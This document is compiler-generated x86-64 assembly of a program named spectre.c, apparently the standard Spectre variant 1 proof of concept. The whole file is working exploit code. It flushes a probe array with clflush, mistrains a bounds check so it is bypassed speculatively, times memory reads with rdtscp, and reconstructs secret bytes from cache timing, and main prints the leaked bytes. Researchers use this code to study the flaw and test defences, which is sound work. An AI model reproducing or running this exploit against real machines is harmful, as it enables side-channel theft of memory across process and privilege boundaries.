	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	test                            # -- Begin function test
	.p2align	4, 0x90
	.type	test,@function
test:                                   # @test
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.LBB1_3
# %bb.1:
	leaq	array1(%rip), %rax
	cmpb	%sil, (%rdi,%rax)
	jne	.LBB1_3
# %bb.2:
	movzbl	%sil, %eax
	leaq	array2(%rip), %rcx
	movb	(%rax,%rcx), %al
	andb	%al, temp(%rip)
.LBB1_3:
	retq
.Lfunc_end1:
	.size	test, .Lfunc_end1-test
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movzbl	check_value(%rip), %esi
	jmp	test                            # TAILCALL
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdx, 16(%rsp)                  # 8-byte Spill
	movq	%rsi, 8(%rsp)                   # 8-byte Spill
	movq	%rdi, 24(%rsp)                  # 8-byte Spill
	leaq	readMemoryByte.results(%rip), %rdi
	movl	$1024, %edx                     # imm = 0x400
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %eax                      # imm = 0x3E7
	leaq	array2(%rip), %r14
	movl	$2863311531, %r15d              # imm = 0xAAAAAAAB
	.p2align	4, 0x90
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_2 Depth 2
                                        #     Child Loop BB3_4 Depth 2
                                        #       Child Loop BB3_5 Depth 3
                                        #         Child Loop BB3_22 Depth 4
                                        #     Child Loop BB3_11 Depth 2
	xorl	%ecx, %ecx
	.p2align	4, 0x90
.LBB3_2:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rcx,%r14)
	clflush	512(%rcx,%r14)
	clflush	1024(%rcx,%r14)
	clflush	1536(%rcx,%r14)
	clflush	2048(%rcx,%r14)
	clflush	2560(%rcx,%r14)
	clflush	3072(%rcx,%r14)
	clflush	3584(%rcx,%r14)
	addq	$4096, %rcx                     # imm = 0x1000
	cmpq	$131072, %rcx                   # imm = 0x20000
	jne	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	movq	%rax, 32(%rsp)                  # 8-byte Spill
                                        # kill: def $eax killed $eax killed $rax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r12d
	movq	%r12, %rbp
	xorq	24(%rsp), %rbp                  # 8-byte Folded Reload
	xorl	%r13d, %r13d
	jmp	.LBB3_4
	.p2align	4, 0x90
.LBB3_9:                                #   in Loop: Header=BB3_4 Depth=2
	addq	$1, %r13
	cmpq	$256, %r13                      # imm = 0x100
	je	.LBB3_10
.LBB3_4:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_5 Depth 3
                                        #         Child Loop BB3_22 Depth 4
	movb	%r13b, check_value(%rip)
	movl	$29, %ebx
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_5 Depth=3
	movl	%ebx, %eax
	imulq	%r15, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%ebx, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rbp, %rdi
	xorq	%r12, %rdi
	movzbl	check_value(%rip), %esi
	callq	test
	subl	$1, %ebx
	jb	.LBB3_7
.LBB3_5:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_22 Depth 4
	clflush	array1_size(%rip)
	movl	$0, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB3_6
	.p2align	4, 0x90
.LBB3_22:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        #       Parent Loop BB3_5 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	addl	$1, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB3_22
	jmp	.LBB3_6
	.p2align	4, 0x90
.LBB3_7:                                #   in Loop: Header=BB3_4 Depth=2
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movb	(%r13,%r14), %al
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$50, %rdx
	ja	.LBB3_9
# %bb.8:                                #   in Loop: Header=BB3_4 Depth=2
	leaq	readMemoryByte.results(%rip), %rax
	addl	$1, (%rax,%r13,4)
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_1 Depth=1
	movl	$-1, %eax
	leaq	readMemoryByte.results(%rip), %r8
	movq	%r8, %rdx
	xorl	%esi, %esi
	movl	$-1, %edi
	jmp	.LBB3_11
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_11 Depth=2
	movl	%eax, %edi
	movl	%esi, %eax
.LBB3_17:                               #   in Loop: Header=BB3_11 Depth=2
	addq	$1, %rsi
	addq	$4, %rdx
	cmpq	$256, %rsi                      # imm = 0x100
	je	.LBB3_18
.LBB3_11:                               #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB3_12
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=2
	movl	(%rdx), %ebp
	movl	%eax, %ebx
	cmpl	(%r8,%rbx,4), %ebp
	jge	.LBB3_12
# %bb.14:                               #   in Loop: Header=BB3_11 Depth=2
	testl	%edi, %edi
	js	.LBB3_16
# %bb.15:                               #   in Loop: Header=BB3_11 Depth=2
	movl	%edi, %ebx
	cmpl	(%r8,%rbx,4), %ebp
	jl	.LBB3_17
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=2
	movl	%esi, %edi
	jmp	.LBB3_17
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_1 Depth=1
	movslq	%eax, %rdx
	movl	(%r8,%rdx,4), %esi
	movslq	%edi, %rbx
	movl	(%r8,%rbx,4), %edi
	leal	(%rdi,%rdi), %ebp
	addl	$5, %ebp
	cmpl	%ebp, %esi
	movq	32(%rsp), %rax                  # 8-byte Reload
	jge	.LBB3_21
# %bb.19:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	$2, %esi
	orl	%edi, %esi
	je	.LBB3_21
# %bb.20:                               #   in Loop: Header=BB3_1 Depth=1
	leal	-1(%rax), %esi
	cmpl	$1, %eax
	movl	%esi, %eax
	ja	.LBB3_1
.LBB3_21:
	xorl	%ecx, readMemoryByte.results(%rip)
	leaq	readMemoryByte.results(%rip), %rcx
	movq	8(%rsp), %rdi                   # 8-byte Reload
	movb	%dl, (%rdi)
	movl	(%rcx,%rdx,4), %edx
	movq	16(%rsp), %rsi                  # 8-byte Reload
	movl	%edx, (%rsi)
	movb	%bl, 1(%rdi)
	movl	(%rcx,%rbx,4), %eax
	movl	%eax, 4(%rsi)
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 24(%rsp)                  # 8-byte Spill
	movl	%edi, 20(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %rbp
	leaq	array2(%rip), %rbx
	leaq	readMemoryByte.results(%rip), %r15
	movl	$2863311531, %r14d              # imm = 0xAAAAAAAB
	jmp	.LBB4_1
	.p2align	4, 0x90
.LBB4_33:                               #   in Loop: Header=BB4_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.13(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_8 Depth 2
                                        #       Child Loop BB4_9 Depth 3
                                        #         Child Loop BB4_10 Depth 4
                                        #         Child Loop BB4_12 Depth 4
                                        #           Child Loop BB4_13 Depth 5
                                        #             Child Loop BB4_35 Depth 6
                                        #         Child Loop BB4_19 Depth 4
	movq	(%rbp), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB4_1
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB4_33
# %bb.3:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB4_34
# %bb.4:                                #   in Loop: Header=BB4_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, 8(%rsp)
	callq	strlen@PLT
	movq	%rax, %rbp
	movl	%ebp, (%rsp)
	movb	$1, check_value(%rip)
	movl	$131072, %edx                   # imm = 0x20000
	movq	%rbx, %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 20(%rsp)                    # 4-byte Folded Reload
	jne	.LBB4_6
# %bb.5:                                #   in Loop: Header=BB4_1 Depth=1
	movq	24(%rsp), %rbp                  # 8-byte Reload
	movq	8(%rbp), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 8(%rsp)
	movq	16(%rbp), %rdi
	leaq	.L.str.3(%rip), %rsi
	movq	%rsp, %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	8(%rsp), %rsi
	movl	(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	(%rsp), %ebp
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	leaq	.L.str.5(%rip), %rdi
	movl	%ebp, %esi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	testl	%eax, %eax
	jle	.LBB4_32
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	xorl	%ebp, %ebp
	jmp	.LBB4_8
	.p2align	4, 0x90
.LBB4_31:                               #   in Loop: Header=BB4_8 Depth=2
	movl	$10, %edi
	callq	putchar@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	testl	%eax, %eax
	leaq	readMemoryByte.results(%rip), %r15
	movq	32(%rsp), %rbp                  # 8-byte Reload
	jle	.LBB4_32
.LBB4_8:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB4_9 Depth 3
                                        #         Child Loop BB4_10 Depth 4
                                        #         Child Loop BB4_12 Depth 4
                                        #           Child Loop BB4_13 Depth 5
                                        #             Child Loop BB4_35 Depth 6
                                        #         Child Loop BB4_19 Depth 4
	movq	8(%rsp), %rsi
	movq	secret(%rip), %rax
	movsbl	(%rax,%rbp), %edx
	leaq	.L.str.6(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	addq	$1, %rbp
	movq	%rbp, 32(%rsp)                  # 8-byte Spill
	movq	8(%rsp), %rax
	movq	%rax, 40(%rsp)                  # 8-byte Spill
	addq	$1, %rax
	movq	%rax, 8(%rsp)
	movl	$1024, %edx                     # imm = 0x400
	movq	%r15, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %eax                      # imm = 0x3E7
	.p2align	4, 0x90
.LBB4_9:                                #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB4_10 Depth 4
                                        #         Child Loop BB4_12 Depth 4
                                        #           Child Loop BB4_13 Depth 5
                                        #             Child Loop BB4_35 Depth 6
                                        #         Child Loop BB4_19 Depth 4
	xorl	%ecx, %ecx
	.p2align	4, 0x90
.LBB4_10:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	(%rcx,%rbx)
	clflush	512(%rcx,%rbx)
	clflush	1024(%rcx,%rbx)
	clflush	1536(%rcx,%rbx)
	clflush	2048(%rcx,%rbx)
	clflush	2560(%rcx,%rbx)
	clflush	3072(%rcx,%rbx)
	clflush	3584(%rcx,%rbx)
	addq	$4096, %rcx                     # imm = 0x1000
	cmpq	$131072, %rcx                   # imm = 0x20000
	jne	.LBB4_10
# %bb.11:                               #   in Loop: Header=BB4_9 Depth=3
	movq	%rax, 48(%rsp)                  # 8-byte Spill
                                        # kill: def $eax killed $eax killed $rax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r15d
	movq	40(%rsp), %r13                  # 8-byte Reload
	xorq	%r15, %r13
	xorl	%ebp, %ebp
	jmp	.LBB4_12
	.p2align	4, 0x90
.LBB4_17:                               #   in Loop: Header=BB4_12 Depth=4
	addq	$1, %rbp
	cmpq	$256, %rbp                      # imm = 0x100
	je	.LBB4_18
.LBB4_12:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB4_13 Depth 5
                                        #             Child Loop BB4_35 Depth 6
	movb	%bpl, check_value(%rip)
	movl	$29, %r12d
	jmp	.LBB4_13
	.p2align	4, 0x90
.LBB4_14:                               #   in Loop: Header=BB4_13 Depth=5
	movl	%r12d, %eax
	imulq	%r14, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r12d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r13, %rdi
	xorq	%r15, %rdi
	movzbl	check_value(%rip), %esi
	callq	test
	subl	$1, %r12d
	jb	.LBB4_15
.LBB4_13:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        #         Parent Loop BB4_12 Depth=4
                                        # =>        This Loop Header: Depth=5
                                        #             Child Loop BB4_35 Depth 6
	clflush	array1_size(%rip)
	movl	$0, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB4_14
	.p2align	4, 0x90
.LBB4_35:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        #         Parent Loop BB4_12 Depth=4
                                        #           Parent Loop BB4_13 Depth=5
                                        # =>          This Inner Loop Header: Depth=6
	addl	$1, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB4_35
	jmp	.LBB4_14
	.p2align	4, 0x90
.LBB4_15:                               #   in Loop: Header=BB4_12 Depth=4
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movb	(%rbp,%rbx), %al
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$50, %rdx
	ja	.LBB4_17
# %bb.16:                               #   in Loop: Header=BB4_12 Depth=4
	leaq	readMemoryByte.results(%rip), %rax
	addl	$1, (%rax,%rbp,4)
	jmp	.LBB4_17
	.p2align	4, 0x90
.LBB4_18:                               #   in Loop: Header=BB4_9 Depth=3
	movl	$-1, %eax
	leaq	readMemoryByte.results(%rip), %r8
	movq	%r8, %rdx
	xorl	%esi, %esi
	movl	$-1, %r15d
	jmp	.LBB4_19
	.p2align	4, 0x90
.LBB4_20:                               #   in Loop: Header=BB4_19 Depth=4
	movl	%eax, %r15d
	movl	%esi, %eax
.LBB4_25:                               #   in Loop: Header=BB4_19 Depth=4
	addq	$1, %rsi
	addq	$4, %rdx
	cmpq	$256, %rsi                      # imm = 0x100
	je	.LBB4_26
.LBB4_19:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	testl	%eax, %eax
	js	.LBB4_20
# %bb.21:                               #   in Loop: Header=BB4_19 Depth=4
	movl	(%rdx), %edi
	movl	%eax, %ebp
	cmpl	(%r8,%rbp,4), %edi
	jge	.LBB4_20
# %bb.22:                               #   in Loop: Header=BB4_19 Depth=4
	testl	%r15d, %r15d
	js	.LBB4_24
# %bb.23:                               #   in Loop: Header=BB4_19 Depth=4
	movl	%r15d, %ebp
	cmpl	(%r8,%rbp,4), %edi
	jl	.LBB4_25
.LBB4_24:                               #   in Loop: Header=BB4_19 Depth=4
	movl	%esi, %r15d
	jmp	.LBB4_25
	.p2align	4, 0x90
.LBB4_26:                               #   in Loop: Header=BB4_9 Depth=3
	movslq	%eax, %r13
	movl	(%r8,%r13,4), %edx
	movslq	%r15d, %rbp
	movl	(%r8,%rbp,4), %esi
	leal	(%rsi,%rsi), %edi
	addl	$5, %edi
	cmpl	%edi, %edx
	movq	48(%rsp), %rax                  # 8-byte Reload
	jge	.LBB4_29
# %bb.27:                               #   in Loop: Header=BB4_9 Depth=3
	xorl	$2, %edx
	orl	%esi, %edx
	je	.LBB4_29
# %bb.28:                               #   in Loop: Header=BB4_9 Depth=3
	leal	-1(%rax), %edx
	cmpl	$1, %eax
	movl	%edx, %eax
	ja	.LBB4_9
.LBB4_29:                               #   in Loop: Header=BB4_8 Depth=2
	xorl	%ecx, readMemoryByte.results(%rip)
	movl	(%r8,%r13,4), %r12d
	movl	(%r8,%rbp,4), %ebp
	leal	(%rbp,%rbp), %eax
	cmpl	%eax, %r12d
	leaq	.L.str.8(%rip), %rsi
	leaq	.L.str.9(%rip), %rax
	cmovlq	%rax, %rsi
	leaq	.L.str.7(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movzbl	%r13b, %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.10(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%r12d, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	testl	%ebp, %ebp
	jle	.LBB4_31
# %bb.30:                               #   in Loop: Header=BB4_8 Depth=2
	movzbl	%r15b, %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.11(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebp, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	jmp	.LBB4_31
	.p2align	4, 0x90
.LBB4_32:                               #   in Loop: Header=BB4_1 Depth=1
	movq	stdin@GOTPCREL(%rip), %rbp
	jmp	.LBB4_1
.LBB4_34:
	xorl	%eax, %eax
	addq	$56, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	
	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
